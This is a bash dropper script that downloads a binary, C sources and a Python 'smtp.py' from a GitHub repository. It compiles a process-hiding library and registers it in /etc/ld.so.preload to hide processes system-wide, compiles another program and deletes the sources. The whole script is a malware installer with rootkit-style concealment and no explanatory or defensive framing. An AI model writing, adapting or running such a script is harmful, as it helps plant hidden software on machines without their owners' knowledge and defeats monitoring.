#!/bin/bash
wget https://github.com/hudahadoh/hime/raw/main/bhmax
wget https://raw.githubusercontent.com/hudahadoh/hime/main/hi.c
wget https://raw.githubusercontent.com/hudahadoh/hime/main/processhider.c
wget https://raw.githubusercontent.com/hudahadoh/hime/main/smtp.py
wget https://raw.githubusercontent.com/hudahadoh/hime/main/smtp.py
chmod +x smtp.py
gcc -Wall -fPIC -shared -o libprocess.so processhider.c -ldl
mv libprocess.so /usr/local/lib/
echo /usr/local/lib/libprocess.so >> /etc/ld.so.preload
chmod +x bhmax
gcc -o hi hi.c
rm hi.c processhider.c
chmod +x hi
